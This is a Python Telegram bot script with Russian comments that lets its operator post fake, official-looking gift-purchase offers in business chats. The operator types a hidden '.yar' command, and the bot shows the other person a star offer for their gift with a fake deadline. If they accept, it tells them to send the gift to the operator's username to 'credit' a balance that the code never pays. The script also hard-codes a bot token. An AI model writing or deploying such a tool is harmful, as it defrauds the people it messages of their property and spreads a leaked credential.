# language: Python, file: bot.py, target: Python 3.10+
import telebot
from telebot import types, apihelper
import time
from datetime import datetime
from flask import Flask
import threading
import os

# --- НАСТРОЙКИ ---
BOT_TOKEN = "8826971050:AAEmQkXsYDancyT6bHy9N8bFFGrCEVUrk4M"
ADMIN_ID = 8973486467
MY_USERNAME = "@zegapo"

# ПРЕМИУМ-ЭМОДЗИ
STAR = '<tg-emoji emoji-id="5875465628285931233">⭐</tg-emoji>'
GIFT_EMOJI = '<tg-emoji emoji-id="5280784083407933462">🎁</tg-emoji>'
POINT_EMOJI = '<tg-emoji emoji-id="5280985696880987202">👉</tg-emoji>'
CHECK_EMOJI = '<tg-emoji emoji-id="5280828200041774726">✔️</tg-emoji>'

# --- ЗАЩИТА ОТ РАЗРЫВА СОЕДИНЕНИЯ ---
# Заставляем бота обновлять сессию каждые 5 минут, чтобы Telegram не разрывал соединение
apihelper.SESSION_TIME_TO_LIVE = 5 * 60

bot = telebot.TeleBot(BOT_TOKEN)

# --- ХРАНИЛИЩЕ ДАННЫХ ОФФЕРОВ ---
active_offers = {}

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is alive", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- ЛОГИКА БОТА ---
def get_current_time():
    return datetime.now().strftime("%H:%M")

def build_offer_text(gift_name, price):
    current_time = get_current_time()
    return (
        f"Вам поступило предложение: <b>{price}</b> {STAR} за {gift_name}\n"
        f"До завершения предложения осталось <b>5 ч. 59 мин..</b>\n"
        f"<i>{current_time}, best offer by {MY_USERNAME}</i> {CHECK_EMOJI}"
    )

def build_success_text(gift_name, price):
    current_time = get_current_time()
    return (
        f"{GIFT_EMOJI} Подарок: <b>{gift_name}</b> успешно продан!\n\n"
        f"{POINT_EMOJI} Передайте подарок покупателю для зачисления на баланс <b>{price}</b> {STAR}.\n"
        f"<i>{current_time}, best offer by {MY_USERNAME}</i> {CHECK_EMOJI}"
    )

def build_decline_text():
    current_time = get_current_time()
    return (
        f"❌ Оффер отклонен.\n"
        f"<i>{current_time}, best offer by {MY_USERNAME}</i> {CHECK_EMOJI}"
    )

def offer_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.row(
        types.InlineKeyboardButton("Принять", callback_data="accept_offer"),
        types.InlineKeyboardButton("Отклонить", callback_data="decline_offer")
    )
    return kb

def success_keyboard():
    kb = types.InlineKeyboardMarkup()
    kb.row(types.InlineKeyboardButton("Передать", url=f"https://t.me/{MY_USERNAME.replace('@', '')}"))
    kb.row(types.InlineKeyboardButton("Готово", callback_data="done_offer"))
    return kb

# --- ТРИГГЕР .yar ---
@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_all_messages(message):
    if message.from_user.id != ADMIN_ID:
        return

    text = message.text.strip()
    
    # Команда: .yar SkyStilettos 4700
    if text.startswith('.yar'):
        parts = text.split()
        if len(parts) < 3:
            try: bot.delete_message(message.chat.id, message.message_id)
            except: pass
            bot.send_message(message.chat.id, "❌ Формат: .yar <Название> <Цена>")
            return

        price = parts[-1]
        gift_name = " ".join(parts[1:-1])

        offer_text = build_offer_text(gift_name, price)
        kb = offer_keyboard()

        conn_id = getattr(message, 'business_connection_id', None)

        try:
            sent_msg = bot.send_message(
                chat_id=message.chat.id,
                text=offer_text,
                parse_mode="HTML",
                reply_markup=kb,
                business_connection_id=conn_id
            )
            
            active_offers[sent_msg.message_id] = {
                "name": gift_name,
                "price": price,
                "conn_id": conn_id
            }
            
        except Exception as e:
            print(f"Ошибка отправки: {e}")
            return

        try:
            bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
        except:
            pass

# --- ОБРАБОТКА КНОПОК ---
@bot.callback_query_handler(func=lambda call: call.data in ["accept_offer", "decline_offer", "done_offer"])
def on_callback(call):
    msg_id = call.message.message_id
    
    if call.data == "accept_offer":
        bot.answer_callback_query(call.id, "Оффер принят")
        
        if msg_id in active_offers:
            data = active_offers[msg_id]
            success_text = build_success_text(data["name"], data["price"])
            
            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=msg_id,
                    text=success_text,
                    parse_mode="HTML",
                    reply_markup=success_keyboard(),
                    business_connection_id=data["conn_id"]
                )
            except Exception as e:
                print(f"Ошибка: {e}")
            
    elif call.data == "decline_offer":
        bot.answer_callback_query(call.id, "Оффер отклонен")
        
        if msg_id in active_offers:
            data = active_offers[msg_id]
            decline_text = build_decline_text()
            
            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=msg_id,
                    text=decline_text,
                    parse_mode="HTML",
                    reply_markup=None,
                    business_connection_id=data["conn_id"]
                )
            except Exception as e:
                print(f"Ошибка: {e}")
                
    elif call.data == "done_offer":
        bot.answer_callback_query(call.id, "Готово")
        try:
            bot.edit_message_reply_markup(
                chat_id=call.message.chat.id,
                message_id=msg_id,
                reply_markup=None
            )
        except:
            pass

# --- ЗАПУСК ---
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("Бот запущен! Триггер: .yar")
    # Увеличиваем таймауты для стабильности на Render
    bot.infinity_polling(timeout=60, long_polling_timeout=50)
